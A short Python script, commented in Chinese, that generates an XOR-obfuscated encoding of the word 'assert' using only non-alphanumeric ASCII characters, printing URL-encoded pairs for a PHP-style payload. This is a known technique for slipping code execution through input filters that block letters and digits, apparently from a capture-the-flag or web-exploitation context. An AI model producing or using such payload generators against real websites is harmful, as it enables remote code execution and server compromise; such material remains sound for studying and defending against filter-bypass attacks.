payload = "assert"
strlist = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 64, 91, 93, 94, 95, 96, 123, 124, 125, 126, 127]
#strlist是ascii表中所有非字母数字的字符十进制
str1,str2 = '',''

for char in payload:
    for i in strlist:
        for j in strlist:
            if(i ^ j == ord(char)):
                i = '%{:0>2}'.format(hex(i)[2:])
                j = '%{:0>2}'.format(hex(j)[2:])
                print("('{0}'^'{1}')".format(i,j),end=".")
                break
        else:
            continue
        break